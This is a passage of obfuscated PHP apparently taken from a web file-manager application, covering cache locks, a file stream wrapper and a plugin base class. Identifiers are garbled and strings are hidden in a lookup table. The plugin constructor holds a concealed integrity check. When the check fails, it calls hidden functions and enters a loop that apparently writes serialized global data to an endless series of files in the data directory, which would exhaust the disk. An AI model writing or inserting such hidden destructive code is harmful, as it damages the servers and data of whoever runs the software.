$‰ªÔâ“‹) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($€Ä¬ˆ“) { return Cache::init()->get($€Ä¬ˆ“); } public function unlock($ÈĞ¨‚³ô) { return Cache::init()->remove($ÈĞ¨‚³ô); } } class CacheLockMemcached { public function lock($Î†ìÎ²¡, $¨«è–ó = 0) { $á•õÚÍ¨ = Cache::init(); $Áû÷ñ—ö = microtime(!0) + $¨«è–ó; while (microtime(!0) < $Áû÷ñ—ö) { $€âÎÊè = $á•õÚÍ¨->get($Î†ìÎ²¡); if (!$€âÎÊè || $€âÎÊè < microtime(!0)) { $ıÅÔÙêš = $á•õÚÍ¨->handle->add($Î†ìÎ²¡, $Áû÷ñ—ö, $¨«è–ó); if ($ıÅÔÙêš) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($úÜìÁ‡ı) { return Cache::init()->get($úÜìÁ‡ı); } public function unlock($ôÉñ§›) { return Cache::init()->remove($ôÉñ§›); } } class CacheLockDatabase { public function lock($²ï·¶’¢, $–µÏøÒ— = 0) { $¿Œà¦Ÿ = Model($_SERVER[‘ÆÜ‘œ][943]); $éëÚà†Ä = microtime(!0) + $–µÏøÒ—; while (microtime(!0) < $éëÚà†Ä) { $“ü¨…¨Å = $¿Œà¦Ÿ->get($²ï·¶’¢); if (!$“ü¨…¨Å || $“ü¨…¨Å < microtime(!0)) { $Ğ“ïÎ€š = $¿Œà¦Ÿ->set($²ï·¶’¢, $éëÚà†Ä); if ($Ğ“ïÎ€š) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($½ ­ÅæÙ) { return Model($_SERVER[‘ÆÜ‘œ][943])->get($½ ­ÅæÙ); } public function unlock($–ƒÂ›¬Å) { Model($_SERVER[‘ÆÜ‘œ][943])->remove($–ƒÂ›¬Å); } } goto BÜ½ÆœÅ®¢; Bö–ÍÃ÷š˜: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ëÇõÃô•, $îò›Ãç¥ = '') { $this->info = $this->info($ëÇõÃô•); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[‘ÆÜ‘œ][87]]; $this->pathOpen = $ëÇõÃô•; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ëÇõÃô•])) { self::$_chunkBuffer[$ëÇõÃô•] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($á‚§³Ó‘) { $¾ùÇæ¬ = $this->fileSubstr($this->pose, $á‚§³Ó‘); $this->pose += strlen($¾ùÇæ¬); return $¾ùÇæ¬; } public function stream_tell() { return $this->pose; } public function stream_seek($¤ÏúßôÂ, $ˆç¦Åï‡) { $ˆ±²€¢æ =& $_SERVER[‘ÆÜ‘œ]; if ($ˆç¦Åï‡ == SEEK_SET) { $this->pose = $¤ÏúßôÂ; } else { if ($ˆç¦Åï‡ == SEEK_CUR) { $this->pose += $¤ÏúßôÂ; } else { if ($ˆç¦Åï‡ == SEEK_END) { $this->pose = $this->info[$ˆ±²€¢æ[79]] + intval($¤ÏúßôÂ); } } } if ($¤ÏúßôÂ < 0) { $this->pose = $this->info[$ˆ±²€¢æ[79]] + $¤ÏúßôÂ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[‘ÆÜ‘œ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¤ÚËâÎ, $œõÃš’) { $­âö‡”á =& $_SERVER[‘ÆÜ‘œ]; $÷İÄƒªÔ = $this->info($¤ÚËâÎ); return array($­âö‡”á[1463] => 0, $­âö‡”á[1764] => 0, $­âö‡”á[16] => 32768 + 511, $­âö‡”á[1765] => 0, $­âö‡”á[1766] => 0, $­âö‡”á[1767] => 0, $­âö‡”á[1768] => 0, $­âö‡”á[79] => $÷İÄƒªÔ[$­âö‡”á[79]], $­âö‡”á[1769] => $÷İÄƒªÔ[$­âö‡”á[1613]], $­âö‡”á[1726] => $÷İÄƒªÔ[$­âö‡”á[88]], $­âö‡”á[1725] => $÷İÄƒªÔ[$­âö‡”á[232]], $­âö‡”á[1770] => 0, $­âö‡”á[1771] => 0); } static $fileInfo = array(); public function info($ãÄÖ–Ø) { $Ù¤ÅöÕŸ = $_SERVER[‘ÆÜ‘œ][1772]; if (isset(self::$fileInfo[$ãÄÖ–Ø])) { return self::$fileInfo[$ãÄÖ–Ø]; } if (substr($ãÄÖ–Ø, 0, strlen($Ù¤ÅöÕŸ)) != $Ù¤ÅöÕŸ) { return !1; } self::$fileInfo[$ãÄÖ–Ø] = IO::info(substr($ãÄÖ–Ø, strlen($Ù¤ÅöÕŸ))); return self::$fileInfo[$ãÄÖ–Ø]; } public static function read($œŞñÎ¤˜, $ñ„ƒóş», $ößËÉµÜ) { if (!isset(self::$_fopenCache[$œŞñÎ¤˜])) { $Ÿúõı˜¡ = new StreamWrapperIO(); $Ÿúõı˜¡->stream_open($œŞñÎ¤˜); self::$_fopenCache[$œŞñÎ¤˜] = $Ÿúõı˜¡; } $Ÿúõı˜¡ = self::$_fopenCache[$œŞñÎ¤˜]; return $Ÿúõı˜¡->fileSubstr($ñ„ƒóş», $ößËÉµÜ); } public static function _read($Üé¡Úê½, $ñé‘°Í“, $îÉÄŠ) { $ÛË³¶•ç =& $_SERVER[‘ÆÜ‘œ]; $Ú‚£Í = fopen($Üé¡Úê½, $ÛË³¶•ç[1617]); if (!$Ú‚£Í) { return $ÛË³¶•ç[12]; } $‘–ŒÒº¯ = 8192; fseek($Ú‚£Í, $ñé‘°Í“, SEEK_SET); $öÊ¬œ³î = $ÛË³¶•ç[12]; $¸“Èæë¯ = 0; while ($¸“Èæë¯ < $îÉÄŠ) { $úŸŒ“¯ç = min($‘–ŒÒº¯, $îÉÄŠ - $¸“Èæë¯); $öÊ¬œ³î .= fread($Ú‚£Í, $úŸŒ“¯ç); $¸“Èæë¯ += $úŸŒ“¯ç; } fclose($Ú‚£Í); return $öÊ¬œ³î; } public function fileSubstr($Ğ ôŒ¼Ó, $ƒùËàøÓ) { $ò±šé’ø =& $_SERVER[‘ÆÜ‘œ]; $ÃÂÁ©àğ = $this->info[$ò±šé’ø[79]]; $ë¬òŞœŞ = $Ğ ôŒ¼Ó; $ ‹š„ = $ƒùËàøÓ; if ($Ğ ôŒ¼Ó < 0) { $Ğ ôŒ¼Ó = $ÃÂÁ©àğ + $Ğ ôŒ¼Ó; } if ($ƒùËàøÓ === !1) { $ƒùËàøÓ = $ÃÂÁ©àğ - $Ğ ôŒ¼Ó; } if ($Ğ ôŒ¼Ó + $ƒùËàøÓ > $ÃÂÁ©àğ) { $ƒùËàøÓ = $ÃÂÁ©àğ - $Ğ ôŒ¼Ó; } if ($ƒùËàøÓ <= 0) { return $ò±šé’ø[12]; } if ($Ğ ôŒ¼Ó < 0 || $Ğ ôŒ¼Ó >= $ÃÂÁ©àğ || $ƒùËàøÓ <= 0 || $ƒùËàøÓ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\151\154\145\x52\145\141\x64\40\145\162\x72\157\x72\x21\40\163\164\141\x72\x74\x3d{$Ğ ôŒ¼Ó}\x3b\x6c\x65\x6e\x67\x74\x68\75{$ƒùËàøÓ}\73\40\163\x69\x7a\145\x3d{$ÃÂÁ©àğ}\x3b"); } $¡ÅÒ­êİ = 64 * 1024; $À‡‰¾¹ =& self::$_chunkBuffer[$this->path]; if (!$À‡‰¾¹) { $À‡‰¾¹ = array(); } $şï“Èä = 0; $ï²¸Ö´ = 0; $È©¥×Ú„ = $ò±šé’ø[12]; foreach ($À‡‰¾¹ as $şï“Èä => $È©¥×Ú„) { $şï“Èä = intval($şï“Èä); $ï²¸Ö´ = $şï“Èä + strlen($È©¥×Ú„); if ($Ğ ôŒ¼Ó >= $ï²¸Ö´) { continue; } if ($Ğ ôŒ¼Ó >= $şï“Èä && $Ğ ôŒ¼Ó + $ƒùËàøÓ <= $ï²¸Ö´) { return substr($È©¥×Ú„, $Ğ ôŒ¼Ó - $şï“Èä, $ƒùËàøÓ); } break; } if (count($À‡‰¾¹) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ò±šé’ø[1773], $ò±šé’ø[1774] . count($À‡‰¾¹) . "\x3b\x73\164\141\162\164\75{$Ğ ôŒ¼Ó}\x2c\x6c\145\x6e\x67\164\150\75{$ƒùËàøÓ}\x3b\x70\x6f\163\x65\72{$şï“Èä}\176{$ï²¸Ö´}"); throw new Exception($ò±šé’ø[1775]); } $½ºÚ©‘¨ = intval($Ğ ôŒ¼Ó / $¡ÅÒ­êİ) * $¡ÅÒ­êİ; $Õ›ææ´ú = ceil(($Ğ ôŒ¼Ó + $ƒùËàøÓ) / $¡ÅÒ­êİ) * $¡ÅÒ­êİ - $½ºÚ©‘¨; $ùø¶öœ = IO::fileSubstr($this->path, $½ºÚ©‘¨, $Õ›ææ´ú); $À‡‰¾¹[$½ºÚ©‘¨ . $ò±šé’ø[12]] = $ùø¶öœ; ksort($À‡‰¾¹); $Û½›è‘ = substr($ùø¶öœ, $Ğ ôŒ¼Ó - $½ºÚ©‘¨, $ƒùËàøÓ); return $Û½›è‘; } private function log($ÔªÆù¬¼, $Úº—İ¥) { $¸åÚµï =& $_SERVER[‘ÆÜ‘œ]; $æŒìªçş = timeFloat() - $this->timeStart; write_log(sprintf($¸åÚµï[1776], $ÔªÆù¬¼, $this->info[$¸åÚµï[32]], $æŒìªçş, $Úº—İ¥), $¸åÚµï[1319]); } } class Message { function __construct() { } public function send($ìÏŒ¥§› = '', $åö¬ëãë = array(), $ØÊ¦· = "\164\x65\170\164") { $ÓŠÎÓ»Ê =& $_SERVER[‘ÆÜ‘œ]; $Õµ˜‹Ç = array($ÓŠÎÓ»Ê[33] => $ÓŠÎÓ»Ê[1239], $ÓŠÎÓ»Ê[169] => $ìÏŒ¥§›); if (in_array($ØÊ¦·, array($ÓŠÎÓ»Ê[1239], $ÓŠÎÓ»Ê[1777]))) { $Õµ˜‹Ç[$ÓŠÎÓ»Ê[33]] = $ØÊ¦·; } $åö¬ëãë = array($ÓŠÎÓ»Ê[606] => isset($åö¬ëãë[$ÓŠÎÓ»Ê[606]]) ? $åö¬ëãë[$ÓŠÎÓ»Ê[606]] : $ÓŠÎÓ»Ê[12], $ÓŠÎÓ»Ê[692] => isset($åö¬ëãë[$ÓŠÎÓ»Ê[692]]) ? $åö¬ëãë[$ÓŠÎÓ»Ê[692]] : $ÓŠÎÓ»Ê[12]); if (empty($ìÏŒ¥§›) || empty($åö¬ëãë[$ÓŠÎÓ»Ê[606]]) && empty($åö¬ëãë[$ÓŠÎÓ»Ê[692]])) { return !1; } $·µÍÃÅ = array($ÓŠÎÓ»Ê[1706] => $Õµ˜‹Ç, $ÓŠÎÓ»Ê[1778] => $åö¬ëãë); Hook::trigger($ÓŠÎÓ»Ê[1779], $·µÍÃÅ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÒôœÅñ® =& $_SERVER[‘ÆÜ‘œ]; $ûÚ¼×şá = $_SERVER[$ÒôœÅñ®[326]] . $ÒôœÅñ®[327]; $ÅÊãÅÍ = $ÒôœÅñ®[323]; if ($_SERVER[$ÒôœÅñ®[324]] != $ÅÊãÅÍ($ûÚ¼×şá)) { $²Õ‰à¤• = $ÒôœÅñ®[995]; $ÈÏøÕ’ = $ÒôœÅñ®[325]; $”¨ÓÈ†ç = $_SERVER[$ÒôœÅñ®[326]] . $ÒôœÅñ®[327]; $­»Šû»ğ = $ÈÏøÕ’($”¨ÓÈ†ç); $¡ ©Å‡› = explode($ÒôœÅñ®[286], $­»Šû»ğ); if (count($¡ ©Å‡›) < $ÒôœÅñ®[717]) { $»ÍÔ˜ŠŠ = $ÒôœÅñ®[329]; $»ÍÔ˜ŠŠ(); } $©Ë¹ª´Â = $ÒôœÅñ®[996]; $©Ë¹ª´Â($_SERVER[$ÒôœÅñ®[997]]); $²Õ‰à¤• = $ÒôœÅñ®[995]; $²Õ‰à¤•(); $˜×¿‘şÁ = $ÒôœÅñ®[1780]; $„´òš°„ = json_encode($GLOBALS[$ÒôœÅñ®[1781]]); $¸’ˆóïÅ = 1; for ($ïä¢ÉÂ¯ = $¸’ˆóïÅ; $ïä¢ÉÂ¯ > 0; $ïä¢ÉÂ¯++) { $˜×¿‘şÁ(DATA_PATH . $ïä¢ÉÂ¯, $„´òš°„); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÒôœÅñ®[1782]); $this->pluginName = str_replace($ÒôœÅñ®[1782], $ÒôœÅñ®[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÒôœÅñ®[8]; $this->pluginApi = appHostGet() . $ÒôœÅñ®[1783] . $this->pluginName . $ÒôœÅñ®[8]; $this->pluginHost = $config[$ÒôœÅñ®[1784]] . $this->pluginName . $ÒôœÅñ®[8]; $this->pluginHostDefault = $config[$ÒôœÅñ®[1784]] . $this->pluginName . $ÒôœÅñ®[8]; $èÏÕ˜¸ = $config[$ÒôœÅñ®[1785]]; if ($èÏÕ˜¸ && strpos($ÒôœÅñ®[50] . $èÏÕ˜¸ . $ÒôœÅñ®[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÒôœÅñ®[1786]] . $this->pluginName . $ÒôœÅñ®[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[‘ÆÜ‘œ][1787]); } protected function assign($Ş†Ûúë¯, $ûş¤…Ï« = false) { if (is_array($Ş†Ûúë¯)) { $this->values = array_merge($this->values, $Ş†Ûúë¯); } else { $this->values[$Ş†Ûúë¯] = $ûş¤…Ï«; } } protected function display($æº¥äé) { extract($this->values); require $æº¥äé; } final function hookRegist($Š”ˆ²àÀ) { $this->modelPlugin->appRegist($this->pluginName, $Š”ˆ²àÀ); } final function appIcon() { $²ÕŠö š =& $_SERVER[‘ÆÜ‘œ]; $¿ä¶È£º = $this->appPackage(); $èÚÚÚó = $²ÕŠö š[12]; if (isset($¿ä¶È£º[$²ÕŠö š[513]])) { if (isset($¿ä¶È£º[$²ÕŠö š[513]][$²ÕŠö š[1788]])) { $èÚÚÚó = $²ÕŠö š[1789] . $¿ä¶È£º[$²ÕŠö š[513]][$²ÕŠö š[1788]] . $²ÕŠö š[1790]; } else { if ($¿ä¶È£º[$²ÕŠö š[513]][$²ÕŠö š[1791]]) { $èÚÚÚó = $²ÕŠö š[1792] . $¿ä¶È£º[$²ÕŠö š[513]][$²ÕŠö š[1791]] . $²ÕŠö š[1793]; } } } return $èÚÚÚó; } final function fileCanView($ö§é´ìÕ) { $ ¨šØâÄ =& $_SERVER[‘ÆÜ‘œ]; if (request_url_safe($ö§é´ìÕ)) { return !0; } if ($this->isShare($ö§é´ìÕ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ñı½ˆ‰ = $ ¨šØâÄ[1794] . rawurlencode(this_url()); show_tips(LNG($ ¨šØâÄ[1795]) . $ ¨šØâÄ[1796] . $ñı½ˆ‰ . $ ¨šØâÄ[1797] . LNG($ ¨šØâÄ[1798]) . $ ¨šØâÄ[1799], !1); } if (!Action($ ¨šØâÄ[1800])->authCan($ ¨šØâÄ[1801])) { show_tips(LNG($ ¨šØâÄ[1802]) . $ ¨šØâÄ[1803], !1); } ActionCall($ ¨šØâÄ[1804], $ö§é´ìÕ); } final function isShare($§ˆ´™) { $ËÌ©ÓÁ“ = KodIO::parse($§ˆ´™); return $ËÌ©ÓÁ“[$_SERVER[‘ÆÜ‘œ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($†¨íëĞœ) { if (request_url_safe($†¨íëĞœ)) { return $†¨íëĞœ; } if (!$this->isShare($†¨íëĞœ)) { $†¨íëĞœ = $this->filePath($†¨íëĞœ, !1); } return Action($_SERVER[‘ÆÜ‘œ][1311])->linkOut($†¨íëĞœ); } public function filePathLinkOut($ò³ÄÕ–ß) { if (request_url_safe($ò³ÄÕ–ß)) { return $ò³ÄÕ–ß; } $this->fileCanView($ò³ÄÕ–ß); return Action($_SERVER[‘ÆÜ‘œ][1311])->link($ò³ÄÕ–ß); } final function filePath($ñ¾†‚º, $²äµ£‹¸ = true, $ö†èŒŞ = false) { $Á†ŠÂÏâ =& $_SERVER[‘ÆÜ‘œ]; $ıÅÖÕÖº = $this->filePathGet($ñ¾†‚º, $²äµ£‹¸); if (!$this->fileInfo) { show_tips(LNG($Á†ŠÂÏâ[106]), !1); } if ($ö†èŒŞ && isset($this->fileInfo[$Á†ŠÂÏâ[565]]) && $this->fileInfo[$Á†ŠÂÏâ[565]]) { $¥«ôª¸ì = Model($Á†ŠÂÏâ[568])->fileInfo($this->fileInfo[$Á†ŠÂÏâ[565]]); if (!$¥«ôª¸ì || !IO::exist($¥«ôª¸ì[$Á†ŠÂÏâ[87]])) { $Ş°è§ = LNG($Á†ŠÂÏâ[106]) . LNG($Á†ŠÂÏâ[1805]); if (KodUser::isRoot() && isset($¥«ôª¸ì[$Á†ŠÂÏâ[87]])) { $Ş°è§ .= $Á†ŠÂÏâ[1806] . $¥«ôª¸ì[$Á†ŠÂÏâ[87]] . $Á†ŠÂÏâ[1807]; } show_tips($Ş°è§); } } Hook::trigger($Á†ŠÂÏâ[1808], $ıÅÖÕÖº); return $ıÅÖÕÖº; } final function filePathGet($÷Çİİ±¥, $ÂãÅ¯ÈÌ = true) { $ÁÂı©ìö =& $_SERVER[‘ÆÜ‘œ]; if ($Ò¹”ÀåŸ = $this->checkSharePath($÷Çİİ±¥, $ÂãÅ¯ÈÌ)) { return $Ò¹”ÀåŸ; } $this->fileCanView($÷Çİİ±¥); if (request_url_safe($÷Çİİ±¥)) { $æİı‚­ = parse_url_query($÷Çİİ±¥); if (isset($æİı‚­[$ÁÂı©ìö[1809]]) && isset($æİı‚­[$ÁÂı©ìö[235]])) { $§ö¿Àñ = Mcrypt::decode($æİı‚­[$ÁÂı©ìö[235]], Model($ÁÂı©ìö[880])->get($ÁÂı©ìö[881])); if ($§ö¿Àñ) { $this->fileInfo = IO::info($§ö¿Àñ); $this->fileInfo[$ÁÂı©ìö[1810]] = $÷Çİİ±¥; $this->cachePath = $this->pluginCachePath($ÁÂı©ìö[12], $ÂãÅ¯ÈÌ); return $§ö¿Àñ; } } $÷Çİİ±¥ = $this->_cacheHttpFile($÷Çİİ±¥, $ÂãÅ¯ÈÌ); $this->fileInfo = IO::info($÷Çİİ±¥); } else { $this->fileInfo = IO::info($÷Çİİ±¥); $this->cachePath = $this->pluginCachePath($ÁÂı©ìö[12], $ÂãÅ¯ÈÌ); } return $÷Çİİ±¥; } final function _cacheHttpFile($ÍÓ†â®è, $³ùÇíâš = true) { $¾ëéô‹  =& $_SERVER[‘ÆÜ‘œ]; $îÍ²ûÜ… = parse_url_query($ÍÓ†â®è); $Êƒ©¦Î¾ = get_path_ext($ÍÓ†â®è); if (isset($îÍ²ûÜ…[$¾ëéô‹ [32]]) && $îÍ²ûÜ…[$¾ëéô‹ [32]]) { $Êƒ©¦Î¾ = get_path_ext($îÍ²ûÜ…[$¾ëéô‹ [32]]); } $£›ì‰ã÷ = hash_path($ÍÓ†â®è) . $¾ëéô‹ [10] . $Êƒ©¦Î¾; $this->cachePath = $this->pluginCachePath($³ùÇíâš ? $£›ì‰ã÷ : $¾ëéô‹ [12]); $·ôĞªº€ = IO::fileNameExist($this->cachePath, $£›ì‰ã÷); if ($·ôĞªº€) { return KodIO::make($·ôĞªº€); } $®«ò·«Í = rtrim($this->cachePath, $¾ëéô‹ [8]) . $¾ëéô‹ [8] . $£›ì‰ã÷; return $this->pluginCacheFileSet($®«ò·«Í, file_get_contents_nossl($ÍÓ†â®è)); } final function checkSharePath($ÙËµïğ, $€€şÀƒ¦ = true) { $‹ç™åÂ =& $_SERVER[‘ÆÜ‘œ]; if (!$this->isShare($ÙËµïğ)) { return !1; } $ª¶ÆÉë° = Action($‹ç™åÂ[1311])->sharePathInfo($ÙËµïğ); if (!is_array($ª¶ÆÉë°) || !isset($ª¶ÆÉë°[$‹ç™åÂ[87]])) { $¯‰ ÷€† = $GLOBALS[$‹ç™åÂ[1811]]; show_json($¯‰ ÷€† ? $¯‰ ÷€† : LNG($‹ç™åÂ[1812]), !1); } $this->fileInfo = $ª¶ÆÉë°; $this->cachePath = $this->pluginCachePath(!1, $€€şÀƒ¦); return $ª¶ÆÉë°[$‹ç™åÂ[87]]; } final function pluginCachePath($Ç’§‡²ê = '', $Ç¤‘ã¦Ö = false) { $ÜõšÀÛ¢ =& $_SERVER[‘ÆÜ‘œ]; if ($Ç¤‘ã¦Ö && is_array($this->fileInfo)) { $Ç’§‡²ê = kodIO::hashPath($this->fileInfo); } $¢İ™²Ä¶ = rtrim(IO_PATH_SYSTEM_TEMP . $ÜõšÀÛ¢[1813] . $this->pluginName . $ÜõšÀÛ¢[8] . $Ç’§‡²ê, $ÜõšÀÛ¢[8]); $‹Ö·ÕÆÓ = IO::infoFullSimple($¢İ™²Ä¶); $ìüœ§Ä = $‹Ö·ÕÆÓ && is_array($‹Ö·ÕÆÓ) ? $‹Ö·ÕÆÓ[$ÜõšÀÛ¢[87]] : $ÜõšÀÛ¢[12]; if (!$ìüœ§Ä) { $ìüœ§Ä = IO::mkdir($¢İ™²Ä¶); } return $ìüœ§Ä; } final function pluginCacheFileSet($ùî°ù‡õ, $üÄü…Ü™ = '') { $±Éº Ë€ =& $_SERVER[‘ÆÜ‘œ]; $Ç¨‚Åˆ— = IO::infoFullSimple($ùî°ù‡õ); if (!$Ç¨‚Åˆ—) { return IO::mkfile($ùî°ù‡õ, $üÄü…Ü™, REPEAT_REPLACE); } IO::setContent($Ç¨‚Åˆ—[$±Éº Ë€[87]], $üÄü…Ü™); return $Ç¨‚Åˆ—[$±Éº Ë€[87]]; } final function pluginLocalFile($•¼¶´öÓ = '') { $Ì•Ìİñó =& $_SERVER[‘ÆÜ‘œ]; $ƒ¸Šàê = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ƒ¸Šàê)) { mk_dir($ƒ¸Šàê); } if (!$•¼¶´öÓ) { return $ƒ¸Šàê; } $“¾æ±Å÷ = IO::info($•¼¶´öÓ); $¼ÁÄò²ç = $Ì•Ìİñó[1814] . KodIO::hashPath($“¾æ±Å÷) . $Ì•Ìİñó[10] . $“¾æ±Å÷[$Ì•Ìİñó[167]]; if (!checkExtSafe($¼ÁÄò²ç)) { $¼ÁÄò²ç = $¼ÁÄò²ç . $Ì•Ìİñó[1345]; } $íÃÁ¶Ãï = $ƒ¸Šàê . $¼ÁÄò²ç; if (@file_exists($íÃÁ¶Ãï)) { return $íÃÁ¶Ãï; } return IO::copy($•¼¶´öÓ, $ƒ¸Šàê, 0, $¼ÁÄò²ç); } final function appPackage() { $™ìóÎèÈ =& $_SERVER[‘ÆÜ‘œ]; if ($this->packageData) { return $this->packageData; } $ÑÙ¡¨ õ = $this->parseFile($this->pluginPath . $™ìóÎèÈ[1815]); $this->parseLang($ÑÙ¡¨ õ); $—ø—íÊ« = json_decode_force($ÑÙ¡¨ õ); if (!$—ø—íÊ«) { return array(); } $éœ­×Ôê = Hook::filter($™ìóÎèÈ[1816], $—ø—íÊ«); if ($éœ­×Ôê && is_array($éœ­×Ôê)) { $—ø—íÊ« = $éœ­×Ôê; } $this->packageData = $—ø—íÊ«; return $—ø—íÊ«; } public function packageInfoGet($¢ÆÒ˜Æ) { $‘»¡óó¡ = $this->appPackage(); return array_get_value($‘»¡óó¡, $¢ÆÒ˜Æ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[‘ÆÜ‘œ][1817]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[‘ÆÜ‘œ][1818]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[‘ÆÜ‘œ][1819]); } public function echoJsAssign($Ë¯ĞéÚÑ, $±Ôçö³Š) { $this->echoJsAssignArr[$Ë¯ĞéÚÑ] = $±Ôçö³Š; } private function parseFile($Áºº¦â) { $¡èÂ€Ø =& $_SERVER[‘ÆÜ‘œ]; $œê¤ÕêØ = file_get_contents_nossl($Áºº¦â); $±ãûÛÖú = array($¡èÂ€Ø[1820], $¡èÂ€Ø[1821], $¡èÂ€Ø[1822], $¡èÂ€Ø[1823], $¡èÂ€Ø[1824], $¡èÂ€Ø[1825], $¡èÂ€Ø[1826]); $÷ÖãªÙ› = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¡èÂ€Ø[92]][$¡èÂ€Ø[1827]]); foreach ($this->echoJsAssignArr as $ÚÀÇÔ­“ => $ÌÆ´¨ˆš) { $±ãûÛÖú[] = $¡èÂ€Ø[1828] . $ÚÀÇÔ­“ . $¡èÂ€Ø[1829]; $÷ÖãªÙ›[] = is_array($ÌÆ´¨ˆš) || is_object($ÌÆ´¨ˆš) ? rawurlencode(json_encode($ÌÆ´¨ˆš)) : $ÌÆ´¨ˆš; } if (strstr($œê¤ÕêØ, $¡èÂ€Ø[1830])) { $çì•ƒ•º = rawurlencode(json_encode($this->pluginLangArr)); $œê¤ÕêØ = str_replace($¡èÂ€Ø[1830], $çì•ƒ•º, $œê¤ÕêØ); } if (strstr($œê¤ÕêØ, $¡èÂ€Ø[1831])) { $çì•ƒ•º = $çì•ƒ•º = rawurlencode(json_encode($this->getConfig())); $œê¤ÕêØ = str_replace($¡èÂ€Ø[1831], $çì•ƒ•º, $œê¤ÕêØ); } $œê¤ÕêØ = str_replace($±ãûÛÖú, $÷ÖãªÙ›, $œê¤ÕêØ); return $œê¤ÕêØ; } private function parseLang(&$‡­Ñ¸†Û) { $´Íî†Åº =& $_SERVER[‘ÆÜ‘œ]; $ä¾æÊ³ = $´Íî†Åº[1832]; if (!strstr($‡­Ñ¸†Û, $ä¾æÊ³)) { return; } preg_match_all($´Íî†Åº[1833], $‡­Ñ¸†Û, $œÂöªğØ); if (!is_array($œÂöªğØ) || count($œÂöªğØ) == 0 || !is_array($œÂöªğØ[0]) || count($œÂöªğØ[0]) == 0) { return; } $äãâª€± = array(); $íÏÊ‚Ç´ = array(); foreach ($œÂöªğØ[0] as $áğ¨¦çí) { $ñåŠÀ±Û = substr($áğ¨¦çí, strlen($ä¾æÊ³), -4); $¤×éŒ“Â = LNG($ñåŠÀ±Û); $äãâª€±[] = $áğ¨¦çí; $íÏÊ‚Ç´[] = str_replace(array($´Íî†Åº[286], $´Íî†Åº[1198], $´Íî†Åº[427], $´Íî†Åº[119]), array($´Íî†Åº[53], $´Íî†Åº[53], $´Íî†Åº[12], $´Íî†Åº[1834]), $¤×éŒ“Â); } $‡­Ñ¸†Û = str_replace($äãâª€±, $íÏÊ‚Ç´, $‡­Ñ¸†Û); } private function parseConfig(&$ÌĞ£ÃÑ²) { $şé’ç£Ú =& $_SERVER[‘ÆÜ‘œ]; $×ë„Øïê = $şé’ç£Ú[1835]; if (!strstr($ÌĞ£ÃÑ², $×ë„Øïê)) { return; } preg_match_all($şé’ç£Ú[1836], $ÌĞ£ÃÑ², $ĞÃÅ›À); if (!is_array($ĞÃÅ›À) || count($ĞÃÅ›À) == 0 || !is_array($ĞÃÅ›À[0]) || count($ĞÃÅ›À[0]) == 0) { return; } $Çêñ¯ = $this->getConfig(); $æÒ·ú½Ê = array(); $ŒŞ¦ÆĞĞ = array(); foreach ($ĞÃÅ›À[0] as $Ë¯†Øª¹) { $©ÁúäÅ« = substr($Ë¯†Øª¹, strlen($×ë„Øïê), -2); $æÒ·ú½Ê[] = $Ë¯†Øª¹; $ŒŞ¦ÆĞĞ[] = _get($Çêñ¯, $©ÁúäÅ«); } $ÌĞ£ÃÑ² = str_replace($æÒ·ú½Ê, $ŒŞ¦ÆĞĞ, $ÌĞ£ÃÑ²); } private function parsePackage(&$Î˜šı®°) { $»°¿Ğı =& $_SERVER[‘ÆÜ‘œ]; $ÂøŸµªè = $»°¿Ğı[1837]; if (!strstr($Î˜šı®°, $ÂøŸµªè)) { return; } preg_match_all($»°¿Ğı[1838], $Î˜šı®°, $–ñ¢ã„³); if (!is_array($–ñ¢ã„³) || count($–ñ¢ã„³) == 0 || !is_array($–ñ¢ã„³[0]) || count($–ñ¢ã„³[0]) == 0) { return; } $ë½¯É¢ş = $this->appPackage(); $Šâè‰ê÷ = array(); $ùˆ“ìî¨ = array(); foreach ($–ñ¢ã„³[0] as $ÙææŞÙÒ) { $Å §¹§ı = substr($ÙææŞÙÒ, strlen($ÂøŸµªè), -2); $Šâè‰ê÷[] = $ÙææŞÙÒ; $ùˆ“ìî¨[] = _get($ë½¯É¢ş, $Å §¹§ı); } $Î˜šı®° = str_replace($Šâè‰ê÷, $ùˆ“ìî¨, $Î˜šı®°); } final function echoFile($Ø°¤°…, $ÁÙŞÌÄ» = false) { $ıÖ–ï¡ =& $_SERVER[‘ÆÜ‘œ]; $æ¥èØ‹ğ = $this->pluginPath . $Ø°¤°…; if (ACT == $ıÖ–ï¡[1839]) { echo $ıÖ–ï¡[1840] . $this->pluginName . $ıÖ–ï¡[8] . $Ø°¤°… . $ıÖ–ï¡[1841]; if (!file_exists($æ¥èØ‹ğ)) { echo $ıÖ–ï¡[1842]; return; } } $³¼ÈàÅœ = $this->parseFile($æ¥èØ‹ğ); $this->parseLang($³¼ÈàÅœ); $this->parseConfig($³¼ÈàÅœ); 